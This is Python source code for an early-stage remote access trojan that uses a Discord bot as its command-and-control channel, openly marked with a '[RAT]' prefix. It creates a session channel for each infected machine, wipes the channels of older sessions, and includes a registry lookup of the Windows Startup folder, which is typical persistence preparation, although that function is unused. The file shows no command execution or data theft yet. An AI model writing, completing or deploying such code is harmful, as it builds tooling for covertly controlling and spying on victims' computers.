import discord
from discord.ext import commands
from dotenv import load_dotenv
import os
import string
import random
import tempfile
import winreg

load_dotenv()
token = os.getenv("DISCORD_BOT_TOKEN")
server_id = os.getenv("SERVER_ID")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
session_name_len = 10
prefix_for_marking = "[RAT]"
delete_old_channels = True 

def get_startup_folder():
    # Open the registry key for the Startup folder path
    key = r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'
    
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key) as reg_key:
        # Get the Startup folder path
        startup_folder = winreg.QueryValueEx(reg_key, 'Startup')[0]
    
    return startup_folder

def create_session_name():
    name = ""
    for i in range(session_name_len):
        name += random.choice(string.ascii_lowercase)
    return name

session_name = create_session_name().upper()
temp_dir = tempfile.gettempdir()
new_temp_dir  = os.path.join(temp_dir, session_name)
os.makedirs(new_temp_dir, exist_ok=True)
print(new_temp_dir)
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}!')
    guild = bot.get_guild(int(server_id))
    if not discord.utils.get(guild.categories, name=prefix_for_marking+session_name):
        try:
            await guild.create_category(name=prefix_for_marking+session_name)
            print(f"Created category '{prefix_for_marking+session_name}' in '{guild.name}'")
        except discord.Forbidden:
            print(f"Missing permissions to create a category in '{guild.name}'.")
        except discord.HTTPException as e:
            print(f"Failed to create category in '{guild.name}': {e}")
        
    else:
        print(f"Category '{prefix_for_marking+session_name}' already exists in '{guild.name}'.")
    
    category = discord.utils.get(guild.categories, name=prefix_for_marking+session_name)
    channel_names = ['Main']
    for channel_name in channel_names:
        if not discord.utils.get(guild.channels, name=channel_name):
            try:
                await guild.create_text_channel(name=channel_name, category=category)
                print(f"Created channel {channel_name} in category '{prefix_for_marking+session_name}' in '{guild.name}'.")

            except discord.Forbidden:
                print(f"Missing permissions to create a channel in category '{prefix_for_marking+session_name}' in '{guild.name}'.")
            except discord.HTTPException as e:
                print(f"Failed to create channel in '{guild.name}': {e}")
    
    #Deleting old channels can be turned off
    if delete_old_channels:
        for category in guild.categories:
            if category.name.startswith(prefix_for_marking) and not category.name.endswith(session_name):
                for channel in category.channels:
                    await channel.delete()
                await category.delete()
        
    print('don1e')    
        


            

    
bot.run(token)

